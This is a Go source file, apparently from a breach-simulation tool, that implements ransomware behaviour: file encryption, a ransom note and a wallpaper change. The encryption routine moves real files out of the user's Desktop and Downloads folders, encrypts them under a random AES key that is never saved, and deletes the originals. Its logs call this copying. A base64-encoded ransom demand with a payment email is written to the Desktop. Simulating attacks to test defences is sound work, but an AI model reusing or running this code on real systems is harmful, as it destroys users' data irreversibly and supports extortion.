package ransomware_generic

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"

	"github.com/FourCoreLabs/firedrill/pkg/sergeant"
	"github.com/FourCoreLabs/firedrill/pkg/utils/winwallpaper"
	"go.uber.org/zap"
)

const (
	ID_encrypt    = "ransom_encrypt"
	Name_encrypt  = "Ransomware Encryption"
	ext           = ".drill"
	ransomDirName = "fireDrillRansomware"

	ID_note            = "ransom_note"
	Name_note          = "Ransomware Note"
	ransomMessage      = `KkFsbCB5b3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhKiAKCkFsbCB5b3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQgZHVlIHRvIGEgc2VjdXJpdHkgcHJvYmxlbSB3aXRoIHlvdXIgUEMgSUQuIApJZiB5b3Ugd2FudCB0byByZXN0b3JlIHRoZW0sIHdyaXRlIHVzIHRvIHRoZSBlLW1haWw6IGZpcmVkcmlsbEBoaWRlLmJpei5zdCAKCllvdSBoYXZlIHRvIHBheSBmb3IgZGVjcnlwdGlvbiBpbiBCaXRjb2lucy4gVGhlIHByaWNlIGRlcGVuZHMgb24gaG93IGZhc3QgeW91IHdyaXRlIHRvIHVzLiAKQWZ0ZXIgcGF5bWVudCwgd2Ugd2lsbCBzZW5kIHlvdSB0aGUgdG9vbCB0aGF0IHdpbGwgZGVjcnlwdCBhbGwgeW91ciBmaWxlcy4gRnJlZSBkZWNyeXB0aW9uIGFzIGd1YXJhbnRlZS4gQmVmb3JlIHBheWluZyB5b3UgY2FuIHNlbmQgdXMgdXAgdG8gNSBmaWxlcyBmb3IgZnJlZSBkZWNyeXB0aW9uLiAKVGhlIHRvdGFsIHNpemUgb2YgZmlsZXMgbXVzdCBiZSBsZXNzIHRoYW4gNE1iIChub24tYXJjaGl2ZWQpLCBhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLCBiYWNrdXBzLCBsYXJnZSBleGNlbCBzaGVldHMsIGV0Yy4pIEF0dGVudGlvbiEgRG8gbm90IHJlbmFtZSBlbmNyeXB0ZWQgZmlsZXMuIApEbyBub3QgdHJ5IHRvIGRlY3J5cHQgeW91ciBkYXRhIHVzaW5nIHRoaXJkLXBhcnR5IHNvZnR3YXJlLCBpdCBtYXkgY2F1c2UgcGVybWFuZW50IGRhdGEgbG9zcy4gClRoZSBkZWNyeXB0aW9uIG9mIHlvdXIgZmlsZXMgd2l0aCB0aGUgaGVscCBvZiB0aGlyZCBwYXJ0aWVzIG1heSBjYXVzZSBpbmNyZWFzZWQgcHJpY2UgKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXIpIG9yIHlvdSBjYW4gYmVjb21lIGEgdmljdGltIG9mIGEgc2NhbS4gQ2hlZXJzIQ==`
	ransomNoteFileName = "ransomnote.txt"

	ID_wallpaper   = "ransom_wallpaper"
	Name_wallpaper = "Ransomware Wallpaper"
)

//----------------------------------------------------------------GENERICS------------------------------------------------------------------------------------

func UserDesktop() string {
	curUser, err := user.Current()
	if err != nil {
		panic(err)
	}

	homeDir := curUser.HomeDir

	desktopPathRegular := filepath.Join(homeDir, "Desktop")
	desktopPathWithOneDrive := filepath.Join(homeDir, "OneDrive", "Desktop")

	desktopPath := desktopPathRegular

	if _, err := os.Stat(desktopPathWithOneDrive); !os.IsNotExist(err) {
		desktopPath = desktopPathWithOneDrive
	}

	return desktopPath
}

func UserDownloads() string {
	curUser, err := user.Current()
	if err != nil {
		panic(err)
	}

	homeDir := curUser.HomeDir

	downloadsPathRegular := filepath.Join(homeDir, "Downloads")
	downloadsPathWithOneDrive := filepath.Join(homeDir, "OneDrive", "Downloads")

	downloadsPath := downloadsPathRegular

	if _, err := os.Stat(downloadsPathWithOneDrive); !os.IsNotExist(err) {
		downloadsPath = downloadsPathWithOneDrive
	}

	return downloadsPath
}

//----------------------------------------------------------------RANSOMWARE ENCRYPTION ----------------------------------------------------------------

type RansomEncryptOptions struct {
	RansomwareDirName string
}

type RansomEncrypt struct {
	ransomDirName string
}

func NewRansomEncrypt(opts ...RansomEncryptOptions) sergeant.Runnable {
	var options RansomEncryptOptions = RansomEncryptOptions{
		RansomwareDirName: ransomDirName,
	}
	if len(opts) > 0 {
		options = opts[0]
	}

	return &RansomEncrypt{ransomDirName: options.RansomwareDirName}
}

func (e *RansomEncrypt) ID() string {
	return ID_encrypt
}

func (e *RansomEncrypt) Name() string {
	return Name_encrypt
}

func copyDesktop(desktopPath, targetPath string) {
	//testPath := desktopPath + "\\" + "test"
	files, _ := ioutil.ReadDir(desktopPath)

	for _, file := range files[:5] {
		log.Printf("Copying %s to %s", file.Name(), targetPath)

		err := os.Rename(desktopPath+"\\"+file.Name(), targetPath+"\\"+file.Name())
		if err != nil {
			log.Print(err)
		}
	}
}

func copyDownloads(downloadsPath, targetPath string) {
	files, _ := ioutil.ReadDir(downloadsPath)

	for _, file := range files[:10] {
		log.Printf("Copying %s to %s", file.Name(), targetPath)

		err := os.Rename(downloadsPath+"\\"+file.Name(), targetPath+"\\"+file.Name())
		if err != nil {
			log.Print(err)
		}
	}
}

func copy() (string, error) {
	desktopPath := UserDesktop()
	downloadsPath := UserDownloads()

	fmt.Println("Desktop path: ", desktopPath)
	fmt.Println("Downloads path: ", downloadsPath)

	//creating test directory path
	targetPath := filepath.Join(desktopPath, ransomDirName)
	log.Printf("Target path: %s", targetPath)

	//checking for existing test directory
	if _, err := os.Stat(targetPath); !os.IsNotExist(err) {
		if err := os.RemoveAll(targetPath); err != nil {
			log.Printf("Failed to delete old test folder %s: %s", targetPath, err.Error())
			return "", err
		}
	}

	//creating test directory
	if err := os.Mkdir(targetPath, 0755); err != nil {
		log.Printf("Failed to create test folder %s: %s", targetPath, err.Error())
		return "", err
	}

	//calling copyDesktop() to copy files
	log.Printf("Copying...")
	copyDesktop(desktopPath, targetPath)
	copyDownloads(downloadsPath, targetPath)

	return targetPath, nil
}

//aesEncryptionKey returns random AES Encrpytion Key
func aesEncryptionKey() []byte {
	ekey := make([]byte, 32)
	_, err := io.ReadFull(rand.Reader, ekey)
	if err != nil {
		panic(fmt.Sprintf("Failed to seed key: %v", err))
	}
	return ekey
}

//aesEncryptData encrypts data using 256-bit AES-GCM. Output: nonce+cipherdata+tag
func aesEncryptData(data []byte, key []byte) (encryptedtext []byte, err error) {
	cipherblock, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcmpack, err := cipher.NewGCM(cipherblock)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcmpack.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}

	return gcmpack.Seal(nonce, nonce, data, nil), nil
}

func encrypt(targetPath string) error {
	//Generate AES key
	aesKey := aesEncryptionKey()

	//Read files from target directory
	files, err := os.ReadDir(targetPath)
	if err != nil {
		return err
	}

	totalFiles := len(files)
	encFilePaths := make([]string, 0, totalFiles)

	log.Printf("Encrypting %d files.", totalFiles)

	//Encrypting files
	for i, file := range files {
		fileAbsPath := filepath.Join(targetPath, file.Name())
		fileData, err := os.ReadFile(fileAbsPath)
		if err != nil {
			return err // everything should work.
		}

		encData, err := aesEncryptData(fileData, aesKey)
		if err != nil {
			return err // everything should work.
		}

		ext := ".drill"
		encFilePath := fileAbsPath + ext

		if err := os.WriteFile(encFilePath, encData, 0644); err != nil {
			return err
		}

		if err := os.Remove(fileAbsPath); err != nil {
			return err
		}

		encFilePaths = append(encFilePaths, encFilePath)
		log.Printf("Encrypted %d/%d files.", i+1, totalFiles)
	}

	return nil
}

func (e *RansomEncrypt) Run(ctx context.Context, logger *zap.Logger) error {

	fmt.Println("Copying files from Desktop and Downloads...")
	targetPath, err := copy()
	if err != nil {
		targetPath = ""
		log.Printf("In main()...Failed to copy files...Cannot copy files and encrypt them...")
		os.Exit(3)
	}

	fmt.Println("Encrypting files...")
	encrypt(targetPath)

	return nil
}

//----------------------------------------------------------------RANSOMWARE NOTE --------------------------------------------------------------------

type RansomNoteOptions struct {
	NoteFileName string
	Note         string
}

type RansomNote struct {
	note         string
	noteFileName string
	base64       bool
}

func NewRansomNote(opts ...RansomNoteOptions) sergeant.Runnable {
	var options RansomNoteOptions = RansomNoteOptions{
		Note:         ransomMessage,
		NoteFileName: ransomNoteFileName,
	}

	if len(opts) > 0 {
		options = opts[0]
	}

	return &RansomNote{note: options.Note, noteFileName: options.NoteFileName, base64: true}
}

func (e *RansomNote) ID() string {
	return ID_note
}

func (e *RansomNote) Name() string {
	return Name_note
}

func (e *RansomNote) Run(ctx context.Context, logger *zap.Logger) error {

	fmt.Println("Dropping ransom note...")

	desktopPath := UserDesktop()
	logger.Sugar().Infof("User desktop path for ransom note: %s", desktopPath)

	ransomNoteFileName := e.noteFileName

	ransomNotePath := filepath.Join(desktopPath, ransomNoteFileName)

	if e.base64 {
		uDec, _ := base64.URLEncoding.DecodeString(e.note)

		e.note = string(uDec)
	}

	if err := os.WriteFile(ransomNotePath, []byte(e.note), 0644); err != nil {
		logger.Sugar().Warnf("Failed to drop ransom note at %s: %s", ransomNotePath, err.Error())
		return err
	}

	logger.Sugar().Infof("Dropped ransom note at %s", ransomNotePath)

	return nil
}

//----------------------------------------------------------------RANSOMWARE WALLPAPER----------------------------------------------------------------

//go:embed ransom.jpg
var ransomWallpaperBuf []byte

type RansomWallpaperOptions struct {
	CurrentWallpaperPath string
}

type RansomWallpaper struct {
	currentWallpaperPath    string
	embeddedWallpaperLength int
}

func NewRansomWallpaper(opts ...RansomWallpaperOptions) sergeant.Runnable {
	wallpaperPath, err := winwallpaper.GetCurrentWallpaperPath()
	if err != nil {
		wallpaperPath = ""
	}
	var options RansomWallpaperOptions = RansomWallpaperOptions{
		CurrentWallpaperPath: wallpaperPath,
	}

	if len(opts) > 0 {
		options = opts[0]
	}

	return &RansomWallpaper{currentWallpaperPath: options.CurrentWallpaperPath, embeddedWallpaperLength: len(ransomWallpaperBuf)}
}

func (e *RansomWallpaper) ID() string {
	return ID_wallpaper
}

func (e *RansomWallpaper) Name() string {
	return Name_wallpaper
}

func (e *RansomWallpaper) Run(ctx context.Context, logger *zap.Logger) error {

	fmt.Println("Changing system wallpaper...")

	logger.Sugar().Infof("Current Wallpaper Path: %s", e.currentWallpaperPath)
	logger.Sugar().Infof("Embedded Ransom Wallpaper size: %d", e.embeddedWallpaperLength)

	switch runtime.GOOS {
	case "windows":
		wallpaperErr := winwallpaper.ChangeSystemWallpaper(ransomWallpaperBuf)
		if wallpaperErr != nil {
			logger.Sugar().Warnf(fmt.Sprintf("error during wallpaper change: %v", wallpaperErr))
		}
		logger.Sugar().Infof("Changed system wallpaper")
	default:
	}
	return nil
}
